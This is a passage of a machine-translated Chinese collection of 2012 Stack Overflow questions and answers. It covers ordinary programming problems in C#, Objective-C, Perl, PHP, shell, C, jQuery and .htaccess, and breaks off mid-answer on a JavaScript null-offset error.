我的 cuda 版本是 4.0：

```
$ nvcc --version
nvcc: NVIDIA (R) Cuda compiler driver
Copyright (c) 2005-2011 NVIDIA Corporation
Built on Thu_May_12_11:09:45_PDT_2011
Cuda compilation tools, release 4.0, V0.2.1221 
```

我每个块的最大线程数是 1024（由 deviceQuery 报告）：

```
Total amount of constant memory:               65536 bytes
  Total amount of shared memory per block:       49152 bytes
  Total number of registers available per block: 32768
  Warp size:                                     32
  Maximum number of threads per block:           1024
  Maximum sizes of each dimension of a block:    1024 x 1024 x 64
  Maximum sizes of each dimension of a grid:     65535 x 65535 x 65535 
```

**更新：：**

我偶然发现了解决问题的方法，但不明白。如果我将我的仿函数从“floor_functor”重命名为基本上其他任何东西，它就可以工作！我*不*知道为什么会这样，并且很想听听任何人对此的想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T20:11:26.130

为了更简单的 CUDA 实现，您可以使用 ArrayFire 在一行代码中执行此操作：

```
p(p < floor) = z; 
```

只需将您的变量声明为 af::array's。

祝你好运！

免责声明：我从事各种 CUDA 项目，包括 ArrayFire。

# c# - 解析字符串 C#

> ID：10102419
> 
> 赞同：3
> 
> 时间：2012-04-11T08:27:59.703
> 
> 标签：c#, parsing, file-io

所以这是我的问题，我试图将文本文件的内容作为字符串获取，然后解析它。我想要的是一个包含每个单词并且只有单词的选项卡（没有空格，没有退格，没有 \n ...）我正在做的是使用一个函数`LireFichier`将包含文件中文本的字符串发回给我（工作正常因为它显示正确）但是当我尝试解析它失败并开始对我的字符串进行随机连接时，我不明白为什么。这是我正在使用的文本文件的内容：

```
truc,
ohoh,
toto, tata, titi, tutu,
tete, 
```

这是我的最后一个字符串：

```
;tete;;titi;;tata;;titi;;tutu; 
```

应该是：

```
truc;ohoh;toto;tata;titi;tutu;tete; 
```

这是我写的代码（所有使用都可以）：

```
namespace ConsoleApplication1{

class Program
{
    static void Main(string[] args)
    {
        string chemin = "MYPATH";
        string res = LireFichier(chemin);
        Console.WriteLine("End of reading...");
        Console.WriteLine("{0}",res);// The result at this point is good
        Console.WriteLine("...starting parsing");
        res = parseString(res);
        Console.WriteLine("Chaine finale : {0}", res);//The result here is awfull
        Console.ReadLine();//pause
    }

    public static string LireFichier(string FilePath) //Read the file, send back a string with the text
    {
        StreamReader streamReader = new StreamReader(FilePath);
        string text = streamReader.ReadToEnd();
        streamReader.Close();
        return text;
    }

    public static string parseString(string phrase)//is suppsoed to parse the string
    {
        string fin="\n";
        char[] delimiterChars = { ' ','\n',',','\0'};
        string[] words = phrase.Split(delimiterChars);

        TabToString(words);//I check the content of my tab

        for(int i=0;i<words.Length;i++)
        {
            if (words[i] != null)
            {
                fin += words[i] +";";
                Console.WriteLine(fin);//help for debug
            }
        }
        return fin;
    }

    public static void TabToString(string[] montab)//display the content of my tab
    {
        foreach(string s in montab)
        {
            Console.WriteLine(s);
        }
    }
}//Fin de la class Program
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T08:38:21.490

我认为你的主要问题是

```
 string[] words = phrase.Split(delimiterChars, StringSplitOptions.RemoveEmptyEntries); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:38:54.580

您可以尝试使用字符串拆分选项为您删除空条目：

```
string[] words = phrase.Split(delimiterChars, StringSplitOptions.RemoveEmptyEntries); 
```

[请参阅此处](http://msdn.microsoft.com/en-us/library/ms131448.aspx)的文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:42:03.083

试试这个：

```
class Program
    {
        static void Main(string[] args)
        {
            var inString = LireFichier(@"C:\temp\file.txt");
            Console.WriteLine(ParseString(inString));
            Console.ReadKey();
        }

        public static string LireFichier(string FilePath) //Read the file, send back a string with the text
        {
            using (StreamReader streamReader = new StreamReader(FilePath))
            {
                string text = streamReader.ReadToEnd();
                streamReader.Close();
                return text;
            }
        }

        public static string ParseString(string input)
        {
            input = input.Replace(Environment.NewLine,string.Empty);
            input = input.Replace(" ", string.Empty);
            string[] chunks = input.Split(',');
            StringBuilder sb = new StringBuilder();
            foreach (string s in chunks)
            {
                sb.Append(s);
                sb.Append(";");
            }
            return sb.ToString(0, sb.ToString().Length - 1);
        }
    } 
```

或这个：

```
public static string ParseFile(string FilePath)
{
    using (var streamReader = new StreamReader(FilePath))
    {
        return streamReader.ReadToEnd().Replace(Environment.NewLine, string.Empty).Replace(" ", string.Empty).Replace(',', ';');
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T08:46:09.727

您的主要问题是您正在拆分`\n`，但从文件中读取的换行符是`\r\n`.

您输出的字符串确实包含您的所有项目，但其中`\r`留下的字符会导致后面的“行”覆盖控制台上的早期“行”。

（`\r`是“返回行首”指令；如果没有`\n`“移至下一行”指令，第 1 行中的文字将被第 2 行、第 3 行和第 4 行中的内容覆盖。）

除了在 as 上拆分之外`\r`，`\n`您还需要在将字符串添加到输出之前检查字符串不为空**或为空**`StringSplitOptions.RemoveEmptyEntries`（或者，最好像其他人提到的那样使用）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T09:49:56.833

```
string ParseString(string filename) {
    return string.Join(";", System.IO.File.ReadAllLines(filename).Where(x => x.Length > 0).Select(x => string.Join(";", x.Split(",".ToCharArray(), StringSplitOptions.RemoveEmptyEntries).Select(y => y.Trim()))).Select(z => z.Trim())) + ";";
} 
```

# c# - HTML 敏捷包 - 过滤 Href 值结果

> ID：10102420
> 
> 赞同：1
> 
> 时间：2012-04-11T08:28:00.727
> 
> 标签：c#, web-scraping, html-agility-pack

我正在开发一个网络爬虫。以下文本显示了本题末尾给出的代码的结果，该代码获取了页面中所有href的值。

我只想获取包含的值`docid=`

> index.php?pageid=a45475a11ec72b843d74959b60fd7bd64556e8988583f
> 
> #
> 
> summary_of_documents.php
> 
> index.php?pageid=a45475a11ec72b843d74959b60fd7bd64579b861c1d7b
> 
> #
> 
> index.php?pageid=a45475a11ec72b843d74959b60fd7bd64579e0509c7f0&apform=司法
> 
> Decisions.php?doctype=Decisions / 签署决议&docid=1263778435388003271#sam
> 
> Decisions.php?doctype=Decisions / 签署决议&docid=12637789021669321156#sam
> 
> ?doctype=Decisions / Signed Resolutions&year=1986&month=January#head
> 
> ?doctype=Decisions / Signed Resolutions&year=1986&month=February#head

这是代码：

```
 string url = urlTextBox.Text;
        string sourceCode = Extractor.getSourceCode(url);

        HtmlAgilityPack.HtmlDocument doc = new HtmlAgilityPack.HtmlDocument();
        doc.LoadHtml(sourceCode);
        List<string> links = new List<string>();

        if (links != null)
        {
            foreach (HtmlAgilityPack.HtmlNode nd in doc.DocumentNode.SelectNodes("//a[@href]"))
            {
                links.Add(nd.Attributes["href"].Value);
            }
        }
        else
        {
            MessageBox.Show("No Links Found");
        }

        if (links != null)
        {
            foreach (string str in links)
            {
                richTextBox9.Text += str + "\n";
            }
        }
        else
        {
            MessageBox.Show("No Link Values Found");
        } 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:38:04.440

为什么不直接替换这个：

```
links.Add(nd.Attributes["href"].Value); 
```

有了这个：

```
if (nd.Attributes["href"].Value.Contains("docid="))
    links.Add(nd.Attributes["href"].Value); 
```

# objective-c - 使图形组件在可可中可重用

> ID：10102422
> 
> 赞同：0
> 
> 时间：2012-04-11T08:28:02.677
> 
> 标签：objective-c, cocoa-touch, cocoa

我已经为我的 iphone 应用程序创建了一个图形组件，以便在多个窗口中重用它。例如：一个带有对象描述的框。

最好的方法是什么？是带`UIVIewController`?。

```
 @interface DescriptionBox : UIViewController 
{
    ...
    } 
```

然后我在一个窗口中使用它：

```
@implementation WindowOne

- (void)loadView {

    ...

    DescriptionBox *component = [[DescriptionBox alloc] initWithFrame:CGRectMake(100, 100, 50, 50)];
    [[self view] addSubview:[component view]];

} 
```

和别的：

```
@implementation WindowTwo

- (void)loadView {

    ...

    DescriptionBox *component = [[DescriptionBox alloc] initWithFrame:CGRectMake(100, 100, 50, 50)];
    [[self view] addSubview:[component view]];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:05:02.547

在大多数情况下，您的组件应该继承 UIView。从那时起，您可以将自定义功能包装在此类中，然后以编程方式将其添加到您的视图中，就像任何其他子视图一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:45:55.403

没有必要使用 UIViewControllers。看看[SVProgressHUD](https://github.com/samvermette/SVProgressHUD)是如何组织的。它是一个类，使您能够显示一些带有活动指示器的弹出消息，它可以调整 UIViewController 旋转并知道何时有一个可见的键盘以重新布局本身。

# perl - 有人知道一个模块，它具有返回 kb/s 下载速度的功能吗？

> ID：10102427
> 
> 赞同：0
> 
> 时间：2012-04-11T08:28:16.220
> 
> 标签：perl, module, download-speed

有人知道一个模块，它具有返回（例如 eth0 ）下载速度的功能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:33:49.507

使用监控程序：atop、iftop、ntop、dstat、icinga、munin、knemo、ksysguardd

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T16:39:00.363

```
#!/usr/bin/perl

use strict;
use warnings;
use Time::HiRes;
use LWP::Simple;

my $url = 'http://www.cnn.com/';
my $file = 'cnn.html';
my $start = [Time::HiRes::gettimeofday()];
getstore($url, $file);
my $time = Time::HiRes::tv_interval($start);
my $size = -s $file;

printf "Speed: %d kbps\n", $size/$time/1000; 
```

# iphone - dispatch_async 被触发 10 次

> ID：10102432
> 
> 赞同：0
> 
> 时间：2012-04-11T08:28:30.653
> 
> 标签：iphone, objective-c, ios, dispatch

正如我在标题中提到的，我的 dispatch_async 触发了 10 次。我用它来使 GUI 响应更快。但是当它触发 10 次时，它需要很长时间才能完成它必须做的所有事情。这是代码：

```
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
    [self calculateAllThatShizzle];
}); 
```

而 calculateAllThatShizzle 方法只有大约 150 行的计算（包括许多循环）。

我确实尝试了以下方法：

```
static dispatch_once_t onceToken;
dispatch_once(&onceToken, ^{
    [self calculateAllThatShizzle];
}); 
```

但似乎它在整个生命周期中只使用一次，每次显示页面时我都需要触发它。

所以问题是：我怎样才能强制 dispatch_async 只触发一次？

任何帮助将不胜感激，谢谢

**编辑**

这些 dispatch_async 和 dispatch_once 在 checkAndCalculateIfNecessary 方法中。这个方法是从 PageControl 调用的，如下所示：

```
- (void)scrollViewDidScroll:(UIScrollView *)sender {
  // We don't want a "feedback loop" between the UIPageControl and the scroll delegate in
  // which a scroll event generated from the user hitting the page control triggers updates from
  // the delegate method. We use a boolean to disable the delegate logic when the page control is used.
  if (pageControlUsed) {
    // do nothing - the scroll was initiated from the page control, not the user dragging
    return;
  }
  // Switch the indicator when more than 50% of the previous/next page is visible
  CGFloat pageWidth = scrollView.frame.size.width;
  int page = floor((scrollView.contentOffset.x - pageWidth / 2) / pageWidth) + 1;
  pageControl.currentPage = page;

  DetailViewController *controller = [viewControllers objectAtIndex:page];
  [controller saveTheValues];

  // load the visible page and the page on either side of it (to avoid flashes when the user starts scrolling)
  [self loadScrollViewWithPage:page - 1];
  [self loadScrollViewWithPage:page];
  [self loadScrollViewWithPage:page + 1];

  if ((page + 1) == kNumberOfPages) {
    [controller checkAndCalculateIfNeccessary];
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:16:22.370

我认为这是因为当用户滚动内容、尝试计算和/或创建一个布尔值来控制计算是否应该触发时`scrollViewDidScroll:`，方法被多次调用。`– scrollViewDidEndDecelerating:`

# php - mysql 选择查询以预填充下拉字段

> ID：10102435
> 
> 赞同：0
> 
> 时间：2012-04-11T08:28:44.487
> 
> 标签：php, mysql, sql

作为我的电子商务应用程序的一部分，我遇到了一个有趣的问题，我一直在努力解决。

我有两件事。

*   类别
*   产品

在关系数据库意义上，一个类别可以有多个产品，一个产品只能属于一个类别。

然后，我有这个电子商务管理优惠券页面，我想在其中修改与特定产品和类别关联的优惠券详细信息。

在修改页面上，我有以下字段

优惠券描述 - 文本字段类型 优惠券价格 - 文本字段类型 优惠券百分比 - 文本字段类型 类别名称 - 下拉字段类型 产品名称 - 下拉字段类型

我有以下 sql 查询。

```
$sql = "SELECT cp_description, cp_discountprice, cp_discountpercent, pd_name, cat_name
        FROM tbl_coupon inner join (tbl_product, tbl_category) on 
        (tbl_product.pd_id = tbl_coupon.pd_id AND     tbl_category.cat_id=tbl_product.cat_id)
        WHERE cp_id = $cpId"; 
```

这个问题真正有趣的是，我无法将**pd_id**和**cat_id**字段包含到 sql 查询中，因此我可以在另一个 sql 代码中操作它们，该代码将在预填充时查找这些字段以在下拉字段中检索正确的选定元素。

我不能在 select 语句中使用**pd_name**或**cat_name**，因为这些字段不是“唯一的”，因此可能会导致问题。

有谁知道解决这个问题的最佳方法是什么？我认为**distinct**关键字可以解决问题……但事实并非如此！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:35:47.860

你不能使用这样的查询吗？

```
SELECT 
    cp.cp_description, cp.cp_discountprice, cp.cp_discountpercent, 
    p.pd_id, p.pd_name, 
    cat.cat_id, cat.cat_name
FROM tbl_coupon cp 
INNER JOIN tbl_product p ON p.pd_id = cp.pd_id
INNER JOIN tbl_category cat ON p.cat_id = cat.cat_id 
WHERE cp_id = $cpId 
```

# linux - Shell 脚本帮助复制他们删除的目录

> ID：10102438
> 
> 赞同：0
> 
> 时间：2012-04-11T08:29:06.873
> 
> 标签：linux, shell

我想编写简单的脚本来复制/备份目录，然后在服务器启动时删除。所以是这样的：

```
TC_DIR=${SERVER_HOME}/terracotta
CLUSTER_STAT_DIR=${TC_DIR}/cluster-stat

cp ${CLUSTER_STAT_DIR} ${TC_DIR}/old.cluster-stat
rm ${CLUSTER_STAT_DIR} 
```

谢谢你们的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:32:51.570

我相信您所做的应该与您在处理目录时需要将 -r 选项同时传递给 cp 和 rm 的唯一补充一起工作。试试这个：

```
TC_DIR=${SERVER_HOME}/terracotta
CLUSTER_STAT_DIR=${TC_DIR}/cluster-stat

cp -r ${CLUSTER_STAT_DIR} ${TC_DIR}/old.cluster-stat
rm -rf ${CLUSTER_STAT_DIR} 
```

编辑：如果您的问题是如何在启动时执行，请查看[此处](https://stackoverflow.com/questions/3036/linux-files-and-scripts-that-execute-on-boot)。

# python - Python中是否有任何基于事件的编程模块

> ID：10102444
> 
> 赞同：1
> 
> 时间：2012-04-11T08:29:13.927
> 
> 标签：python, event-handling

我们可以在 Python 中进行事件驱动编程吗？如果可以的话，有人可以告诉我们要查看哪些模块（标准或第 3 方模块）。我希望我不是在问一个模棱两可的问题，我是 Python 新手，所以请不要介意。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:42:18.103

当我看到你的帖子时，我首先想到的是 Twisted。当然这取决于你的目标是什么，但你应该在 [这里查看](http://twistedmatrix.com/trac/)

# java - PlayFramework 和 jquery 图表

> ID：10102445
> 
> 赞同：0
> 
> 时间：2012-04-11T08:29:14.613
> 
> 标签：java, json, jquery, playframework

我正在尝试 在 play 1.2.4中使用[https://github.com/thegrubbsian/jquery.ganttView](https://github.com/thegrubbsian/jquery.ganttView)

已经检查了[JQuery GanttChart - 应用数据](https://stackoverflow.com/questions/7370988/jquery-ganttchart-apply-data)

但我的问题是如何将 JSON 渲染到视图中，

我尝试了一个简单的 renderJSON("Hello"); 并在视图中捕获，问题是我只能下载像 4fporLKs.part1 这样的文件，里面有 Hello :(

有人能解释一下我该怎么做吗

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T13:04:49.543

其他人正在和我一样工作，但没有得到它

```
 <script type="text/javascript">
    $(function () 
    {

        $("#ganttChart").ganttView({ 
           data : 'dataUrl: "data.json"',
            slideWidth: 900,
            behavior: {
                onClick: function (data) { 
                    var msg = "You clicked on an event: { start: " + data.start.toString("M/d/yyyy") + ", end: " + data.end.toString("M/d/yyyy") + " }";
                    $("#eventMessage").text(msg);
                },
                onResize: function (data) { 
                    var msg = "You resized an event: { start: " + data.start.toString("M/d/yyyy") + ", end: " + data.end.toString("M/d/yyyy") + " }";
                    $("#eventMessage").text(msg);
                },
                onDrag: function (data) { 
                    var msg = "You dragged an event: { start: " + data.start.toString("M/d/yyyy") + ", end: " + data.end.toString("M/d/yyyy") + " }";
                    $("#eventMessage").text(msg);
                }
            }
        });

        //$("#ganttChart").ganttView("setSlideWidth", 600);
    });
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:37:08.587

`"hello"`不是格式正确的 json 字符串，请尝试：

```
renderJSON("{\"hello\":\"world\"}"); 
```

另请查看[Play 的控制器文档](http://www.playframework.org/documentation/1.2.4/controllers "Play 的控制器文档")以了解如何渲染 ie。List 中的 json （段落：**返回 JSON 字符串**）

# c - *****double 的合适替代品

> ID：10102450
> 
> 赞同：0
> 
> 时间：2012-04-11T08:29:24.567
> 
> 标签：c, list, dynamic, allocation, replace

我有这个大数据结构，它是一个列表列表列表列表列表的列表。显然，它的处理效率极低。运行我的应用程序所花费的大约 70% 的时间用于在列表末尾的双精度中写入零。我需要一个满足两个约束的更快的替换：

1）所有内存必须连续分配（即一大块内存）

2）我必须使用通常的 A[][][][][] 语法访问这个块

至于现在，我想使用 *double 来保存整个块并重用我的列表列表 ... 来存储指向块中适当区域的指针。

有更好的想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:46:58.203

如何使用 2D 数组实现这一点的一个例子是，我懒得做 5D 案例，是

```
double **a;
a = malloc (n * sizeof(*double));
a[0] = malloc (n * m * sizeof(double));
for (int i = 1; i < n; ++i)
   a[i] = a[0][i*n]; 
```

这样，您可以决定是否希望使用 a[0][i*n] 或 a[i][j] 对其进行索引。内存是连续的，您只需进行两次分配即可。当然，这也需要内存中有一个空闲的 n*m*sizeof(double) 块，但是由于您要求连续分配内存，我希望这会得到满足。这也意味着您必须使用以下方法正确删除它：

```
free(a[0]);
free(a); 
```

所以我会创建一个 create5Darray (n,m,k,l,t) 和一个 delete5Darray 函数来简化它。

# unix - 在当前控制台中将 *Interruptible sleep* 进程置于前台

> ID：10102454
> 
> 赞同：0
> 
> 时间：2012-04-11T08:29:39.700
> 
> 标签：unix, process

我的一个进程处于可*中断睡眠*状态。注意我从不同的 tty 运行了这个过程。那个 tty 死了，目前这个进程是孤立的。

```
ps ax | grep sync-d[b]                                                                                                                                                                     
31809 ?        S      0:00 sync-db upgrade 
```

状态的`S`意思`Interruptible sleep (waiting for an event to complete)`。如何在*当前 tty*上向其发送要完成的事件？

我已经发出`CONT`信号了。但它似乎没有反应。

```
kill -CONT 31809 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:34:17.463

这可能对你有用.. [reptyr](https://github.com/nelhage/reptyr.git)

毫无疑问，执行此操作所需的黑客量相当大 - 所以如果它不起作用，请不要感到惊讶。

# jquery - 按类名查找所有图像并返回 src 属性

> ID：10102456
> 
> 赞同：1
> 
> 时间：2012-04-11T08:29:48.030
> 
> 标签：jquery

我正在尝试获取所有带有类的图像`front`并显示它们的 src 属性。查看控制台它正在工作，但它返回带有类前面的图像以及带有类的图像以及整个 img 代码。我只想要 src 属性。我怎么能这样做？

**HTML**

```
<div id="results"></div>

<div id="mm_grid">
   <!-- Grid contents written dynamically -->
   <div class="mm_row">
      <div class="mm_window" id="tile0" onclick="flipImage(this)"><img class="front" src="public/images/mm_image5.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_window" id="tile1" onclick="flipImage(this)"><img class="front" src="public/images/mm_image5.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_clearfix"></div>
   </div>
   <div class="mm_row">
      <div class="mm_window" id="tile2" onclick="flipImage(this)"><img class="front" src="public/images/mm_image8.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_window" id="tile3" onclick="flipImage(this)"><img class="front" src="public/images/mm_image0.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_clearfix"></div>
   </div>
   <div class="mm_row">
      <div class="mm_window" id="tile4" onclick="flipImage(this)"><img class="front" src="public/images/mm_image3.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_window" id="tile5" onclick="flipImage(this)"><img class="front" src="public/images/mm_image2.jpg" alt="" /><img class="back" src="public/images/mm_back.jpg" alt="" /></div>
      <div class="mm_clearfix"></div>
   </div>
</div>​ 
```

**jQuery**

```
var linkArray = $("img.front").map(function() {
    return $(this).parent().html();
}).get();

console.log(linkArray); 
```

**结果**

 **```
["<img class="front" src="public/images/mm_image5.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">", "<img class="front" src="public/images/mm_image5.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">", "<img class="front" src="public/images/mm_image8.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">", "<img class="front" src="public/images/mm_image0.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">", "<img class="front" src="public/images/mm_image3.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">", "<img class="front" src="public/images/mm_image2.jpg" alt=""><img class="back" src="public/images/mm_back.jpg" alt="">"] 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:32:45.160

代替

```
return $(this).parent().html(); 
```

和

```
return $(this).attr('src'); 
```

在您的示例中，您将获得图像父元素（即 div 元素）的 HTML 代码。这样您就可以单独获得 img 元素的`src`属性。`front`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:33:06.720

```
var $imgs = $('img.front'),
    arr = [];

$imgs.each(function () {
    arr.push($(this).attr('src'));
});

console.log(arr.join(', ')); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:34:06.517

```
var linkArray = $("img.front").map(function() {
    return this.src;
}).get(); 
```

无需在 map() 中通过 jQuery 函数

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T08:35:25.577

如果您只需要 SRC 属性，则必须执行以下操作：

```
$("img.front").each(function (index, element){
   alert($("img.front").eq(index).attr("src"));
}); 
```

这将使用 FRONT 类打印出每个图像的 SRC。**

# c# - 在 ASP.NET 中导出到 Excel 时如何将数字格式化为字符串数据类型？

> ID：10102460
> 
> 赞同：4
> 
> 时间：2012-04-11T08:30:17.157
> 
> 标签：c#, asp.net, numbers, export-to-excel

在我的 ASP.NET Web 表单项目中，我有一个将数据 () 导出`List<Profit>`到 Excel 的事件。我正在使用老式方式，使用 .XLS 扩展模式写入 HTML 文件

`Profit`实体具有一些具有数字数据的字符串属性，例如`"100000561234"`

当我导出到 Excel 时，这些列就像`1.00001E+11`在 Excel 列中一样，因此用户必须右键单击 Excel 列并更改格式单元格。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-02T05:40:47.497

只需在您的 HTML 代码前添加以下行，即可解决问题。此样式表将应用于每个单元格，无需手动将单元格格式化为字符串。

```
Response.Write("<style> TD { mso-number-format:\@; } </style>"); 
```

# php - 如何使用 htaccess 在链接中将 url 作为值传递？

> ID：10102463
> 
> 赞同：0
> 
> 时间：2012-04-11T08:30:27.580
> 
> 标签：php, .htaccess

我想通过链接传递一个网址

我的 htaccess 代码是：

```
RewriteRule ^info/(.*)$ folder1/page1.php?url=$1 [L] 
```

但我的结果是：

```
$_GET['url'] = http:/stackoverflow.com (one slash is missing , http:/) 
```

我需要 $_GET['url'] 作为[http://stackoverflow.com](http://stackoverflow.com)

怎么可能使用htaccess？

有人可以帮助我吗......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:37:12.347

我认为 Xzibit 对此有一个正确的观点：

[http://cdn.memegenerator.net/instances/400x/18286577.jpg http://cdn.memegenerator.net/instances/400x/18286681.jpg](http://cdn.memegenerator.net/instances/400x/18286681.jpg)

短篇小说：当您想在链接中嵌入 url 时使用 urlencode，我认为它会解决您的问题。

[http://php.net/manual/en/function.urlencode.php](http://php.net/manual/en/function.urlencode.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T10:38:51.153

这是不可能的，`/`斜杠是 url 分隔符。在用作参数之前，您必须对其进行编码。例如 ：`site.com/info/http%3A%2F%2Fstackoverflow.com`

```
$url = isset($GET['url']) ? urldecode($GET['url']) : 'default'; 
```

或者最好不要使用`http://`. 和`site.com/info/stackoverflow.com`。在 php 中：

```
$url = isset($GET['url']) ? 'http://'.$GET['url'] : 'default'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T12:42:52.630

使用 RewriteRule 来匹配 URI 将不起作用，因为 Apache 会将多个斜杠剥离为 1。以下是使其成为可能的代码`%{THE_REQUEST}`：

```
RewriteCond %{THE_REQUEST} ^[A-Z]{3,}\s/+info/([^\s\?]+) [NC]
RewriteRule ^ index.php?url=%1 [L,QSA] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T02:53:04.263

如果事关重大：

```
$_GET['url'] = str_replace('http:/', 'http://', $_GET['url']); 
```

# javascript - 未捕获的类型错误：无法读取 null 的属性“顶部”

> ID：10102465
> 
> 赞同：6
> 
> 时间：2012-04-11T08:30:39.247
> 
> 标签：javascript, jquery, html

我遇到了一个非常烦人的 javascript 错误。世界著名：

> 未捕获的类型错误：无法读取 null 的属性“顶部”

这是代码：

```
$(function() {

var setTitle = function(title, href) {
        title = 'Derp: ' + title;
        href = href || '';

        history.pushState({id: href}, title, href.replace('#', '/'));
        document.title = title;
    },
    scroll = function(url, speed) {

        var href = typeof url == 'string' ? url : $(this).attr('href'),
            target = $(href),
            offset = target.offset(),
            title = target.find('h1').text();

        if(typeof url == 'number') {
            target = [{id:''}];
            offset = {top: url};
        }

        //  And move the element
        if(offset.top) {
            //  Set the new URL and title
            setTitle(title, href);

            //  Make sure we're not moving the contact panel
            if(target[0].id != 'contact') {
                $('html, body').animate({scrollTop: offset.top}, speed);
            }
        }

        return false;
    };

//  Handle existing URL fragments on load
if(location.pathname.length > 1) {
    scroll(location.pathname.replace('/', '#'), 0);
}

$('a#logo').click(function() {
    $('html,body').animate({scrollTop: 0});
    return false;
});

//  Handle internal link clicks
$('a[href^=#]:not(#logo)').click(scroll);

//  Close the "Get In Touch" box
var box = $('#contact'),
    moveBox = function() {
        var closing = $(this).attr('class') == 'close',
            amount = closing ? -(box.height() + 20) : 0,
            cb = closing ? '' : function() { box.animate({marginTop: -10}, 150); };

        box.animate({marginTop: amount}, cb);
    };

box.css('margin-top', -(box.height() + 20));
$('#contact a.close, #get-in-touch').click(moveBox);

//  Nasty little fix for vertical centering
$('.vertical').each(function() {
    $(this).css('margin-top', -($(this).height() / 2));
});

//  Work panels
var parent = $('#work'),
    panels = parent.children('div');

panels.each(function() {
    $(this).css('width', 100 / panels.length + '%');
})

parent.css('width', (panels.length * 100) + '%');

//  Bind the keyboards
$(document).keyup(function(e) {
    var actions = {
        //  Left
        37: function() {
            var prev = panels.filter('.active').prev().not('small');

            if(prev.length > 0) {
                prev.siblings().removeClass('active');

                setTitle(prev.find('h1').text(), prev[0].id);

                setTimeout(function() {
                    prev.addClass('active');
                }, 250);

                parent.animate({left: '+=100%'}).css('background-color', '#' + prev.attr('data-background'));
            }
        },

        //  Right
        39: function() {
            var next = panels.filter('.active').next();

            if(next.length > 0) {
                next.siblings().removeClass('active');

                setTitle(next.find('h1').text(), next[0].id);

                setTimeout(function() {
                    next.addClass('active');
                }, 250);

                parent.animate({left: '-=100%'}).css('background-color', '#' + next.attr('data-background'));
            }
        },

        //  Down
        40: function() {
            var w = $(window),
                height = w.height() * panels.children('div').length,
                h = w.height() + w.scrollTop();

            if(h < height) {
                scroll(h);
            }
        },

        //  Up
        38: function() {
            var w = $(window);
            $('html,body').animate({scrollTop: w.scrollTop() - w.height()});
        }
    };

    //  Call a function based on keycode
    if(actions[e.which]) {
        actions[e.which]();
    }

    e.preventDefault();
    return false;
});

//  Fix crazy resize bugs
$(window).resize(function() {

    var m = $(this),
        h = m.height(),
        s = m.scrollTop();

    if((h - s) < (h / 2)) {
        m.scrollTop(h);
    }

    //$('html,body').animate({scrollTop: s});
});

//  slideshow
var woof = function() {
        var slides = $('#molly li'),
            active = slides.filter('.active');

        if(!active.length) {
            active = slides.last();
        }

        active.addClass('active');

        var next = active.next().length ? active.next() : slides.first();

        next.css('opacity', 0).addClass('active').animate({opacity: 1}, function() {
            active.removeClass('active last-active');
        });
    };

setInterval(woof, 3000);

//  easing
$.easing.swing = function(v,i,s,u,a,l) {
    if((i /= a / 2) < 1) {
        return u / 2 * (Math.pow(i, 3)) + s;
    }

    return u / 2 * ((i -= 2) * i * i + 2) + s;
};

//  Change the default .animate() time: http://forr.st/~PG0
$.fx.speeds._default = 600;
});

try{Typekit.load()}catch(e){} 
```

对不起这个长怪物，但我认为它可能对你看到整个事情有用。错误警告出现在这部分：

```
//  And move the element
        if(offset.top) { 
```

> 未捕获的类型错误：无法读取 null 的属性“顶部”

这是代码中的第 23 行。

而已。你能给我一个关于如何解决这个问题的提示吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:11:18.663

```
var href = typeof url == 'string' ? url : $(this).attr('href'),
target = $(href), //line 2
offset = target.offset(), //line 3 
```

我相信这一定与发生`line 2`错误有关`target``null`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:36:32.563

根据 jQuery 源，`jQuery.fn.offset`仅`null`在以下情况下返回：

